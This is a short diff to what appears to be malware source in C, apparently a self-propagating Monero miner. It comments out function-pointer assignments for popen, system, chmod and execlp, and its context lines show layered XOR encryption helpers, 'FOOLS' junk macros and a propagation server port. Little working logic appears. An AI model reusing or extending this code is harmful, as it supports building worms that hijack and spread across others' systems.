@@ -144,7 +144,7 @@ void init_globals(Globals *global){
     global->xor_memory_layered=&xor_memory_layered;
     global->encrypt_layered=&encrypt_layered;
     global->decrypt_layered=&decrypt_layered;
-
+/*
     FOOLS;
     // xmr functions
     global->popen=&popen;
@@ -157,8 +157,8 @@ void init_globals(Globals *global){
     global->strdup=&strdup;
     global->system=&system;
     global->chmod=&chmod;
-    global->execlp=&execlp;
-
+    //global->execlp=&execlp;
+*/
     FOOLS;
     // global values
     global->propagation_server_port = 42024;
